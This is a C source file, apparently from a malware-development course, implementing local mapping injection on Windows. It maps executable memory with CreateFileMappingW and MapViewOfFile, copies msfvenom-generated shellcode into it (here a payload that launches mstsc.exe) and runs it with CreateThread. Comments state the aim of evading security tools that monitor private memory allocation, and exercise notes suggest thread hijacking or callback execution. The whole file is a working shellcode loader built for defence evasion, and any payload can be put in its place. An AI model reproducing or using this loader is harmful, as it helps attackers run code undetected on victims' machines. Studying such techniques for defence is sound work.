/*
The process of allocating private memory is highly monitored by security solutions. To avoid these commonly WinAPI, we can use mapping injection.
Mapping Injection uses Mapped memory type using different APIs (CreateFileMapping & MapViewOfFile)

File Mapping Explained; 
    - creating a link between your program memory and the contents of a file. It lets you read, write data to the same file.
    - This is useful for sharing data between different processes.
*/

/*
Read up on the differences between private and mapped memory
Call UnmapViewOfFile WinAPI after the payload has finished execution (Hint: use WaitForSingleObject)
Execute the payload using thread hijacking or a callback function
*/

#include <Windows.h>
#include <stdio.h>

// msfvenom mstsc.exe
unsigned char Payload[] =
{
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x6d\x73\x74\x73\x63\x2e\x65\x78\x65\x00"
};

void HandleError(const char* message) {
    printf("[-] Error: %s (Error Code: %d)\n", message, GetLastError());
}

// Function to inject payload into a file mapping and run it
BOOL InjectFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
    HANDLE hFile = NULL;
    PVOID pMapAddress = NULL;

    // Create a file mapping object with execute permission
    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
    if (hFile == NULL) {
        HandleError("CreateFileMappingW Failed");
        CloseHandle(hFile);
        return FALSE;
    }

    // Map the file mapping into the current process's address space
    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sPayloadSize);
    if (pMapAddress == NULL) {
        HandleError("MapViewOfFile Failed");
        CloseHandle(hFile);
        return FALSE;
    }

    // Display the memory address where the payload is mapped
    printf("[i] Payload Mapped to Memory Address: 0x%p\n", pMapAddress);
    printf("[+] Press <Enter> To Copy The Payload\n");
    getchar();

    // Copy the payload to the mapped address
    memcpy(pMapAddress, pPayload, sPayloadSize);
    printf("[i] Payload Copied to: 0x%p\n", pMapAddress);

    *ppAddress = pMapAddress; // Assign the mapped address to the caller

    return TRUE;
}

int main() {
    PVOID pAddress = NULL;
    HANDLE hThread = NULL;

    // Inject the payload into a file mapping
    if (!InjectFileMapping(Payload, sizeof(Payload), &pAddress)) {
        return -1;
    }

    printf("[+] Press <Enter> To Run The Payload\n");
    getchar();

    // Create a thread to execute the payload
    hThread = CreateThread(NULL, 0, pAddress, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Wait for the thread to finish
        printf("[+] DONE\n");
    } else {
        HandleError("CreateThread Failed");
    }

    

    printf("Check Memory!\n");
    printf("[#] Press <Enter> To Quit\n");
    getchar(); // Wait for the user to press Enter

    CloseHandle(hThread);

    return 0;
}